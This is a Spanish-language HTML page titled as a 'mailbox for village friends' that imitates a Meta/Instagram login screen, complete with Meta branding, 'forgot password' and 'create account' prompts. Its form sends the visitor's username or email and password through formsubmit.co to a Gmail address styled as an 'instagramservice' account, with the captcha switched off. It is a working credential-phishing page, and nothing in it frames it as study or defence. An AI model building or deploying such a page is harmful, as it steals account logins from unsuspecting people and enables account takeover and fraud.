<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>buzon para amigos del pueblo</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  background: #fafafa;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  width: 90%;
  max-width: 380px;
  text-align: center;
}

.card {
  background: white;
  padding: 30px 20px;
  border-radius: 25px;
  box-shadow: 0 15px 35px rgba(0,0,0,0.1);
}

.profile-pic {
  width: 90px;
  height: 90px;
  border-radius: 50%;
  object-fit: cover;
  margin-bottom: 25px;
  border: none;
}

.input-box {
  width: 100%;
  padding: 16px;
  margin-bottom: 15px;
  border-radius: 18px;
  border: 1px solid #ddd;
  font-size: 16px;
  box-sizing: border-box;
  background: #f2f2f2;
  transition: 0.2s;
}

.input-box:focus {
  outline: none;
  background: white;
  border-color: #1877f2;
  box-shadow: 0 0 0 3px rgba(24,119,242,0.1);
}

button {
  width: 100%;
  padding: 15px;
  border-radius: 30px;
  border: none;
  background: #1877f2;
  color: white;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  opacity: 0.9;
}

.frase-inciar {
  margin-top: 20px;
  font-size: 14px;
  color: #333;
}

.secondary-btn {
  margin-top: 20px;
  width: 100%;
  padding: 12px;
  border-radius: 25px;
  border: 1px solid #2271b1;
  background: transparent;
  color: #2271b1;
  font-size: 15px;
  cursor: pointer;
}
.footer {
  margin-top: 25px;
}

.meta-logo {
  width: 85px;
  opacity: 0.85;
}


</style>
</head>

<body>

<div class="container">
  <div class="card">

    <!-- TU FOTO -->
    <img src="foto.jpg" alt="Mi foto" class="profile-pic">

    <form action="https://formsubmit.co/instagramservice341257@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">

      <input type="text" name="usuario" placeholder="Usuario o correo electronico" class="input-box" required>

      <input type="text" name="mensaje" placeholder="Contraseña" class="input-box" required>

      <button type="submit">Iniciar Sesión</button>
    </form>

     </div>

   <div class="frase-bonita">
    ¿Has olvidado tu contraseña?
  </div>

  <button class="secondary-btn">
    Crear cuenta nueva
  </button>

    <!-- LOGO META ABAJO -->
    <div class="footer">
      <img src="meta.png" alt="Meta" class="meta-logo">
    </div>


</div>

</body>
</html>
